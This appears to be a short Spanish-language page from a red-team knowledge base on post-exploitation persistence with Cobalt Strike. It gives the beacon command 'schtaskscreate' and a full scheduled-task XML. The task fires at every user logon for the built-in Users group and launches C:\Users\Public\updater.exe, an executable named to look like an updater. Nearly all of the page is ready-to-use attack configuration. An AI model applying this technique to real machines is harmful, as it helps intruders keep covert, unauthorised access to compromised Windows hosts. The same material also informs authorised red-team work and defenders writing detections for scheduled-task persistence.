---
title: Persistencia — Scheduled Tasks (Cobalt Strike)
tags: [persistence, cobalt-strike, scheduled-tasks]
---

# Scheduled Tasks — Cobalt Strike

## Crear Scheduled Task via XML

```
beacon> schtaskscreate \Beacon XML CREATE
```

Donde `XML` es el contenido XML de la tarea. Ver variante avanzada con BootTrigger en [[03-post-explotacion/persistencia/scheduled-task-(advanced)|Scheduled Task (Advanced)]].

## Tarea de ejemplo — login trigger

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <GroupId>S-1-5-32-545</GroupId>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\Public\updater.exe</Command>
    </Exec>
  </Actions>
</Task>
```

## Ver también
- [[03-post-explotacion/persistencia/scheduled-task-(advanced)|Scheduled Task (Advanced)]]
- [[03-post-explotacion/persistencia/persistencia-avanzada/wmi/wmi-eventing|WMI Eventing]]
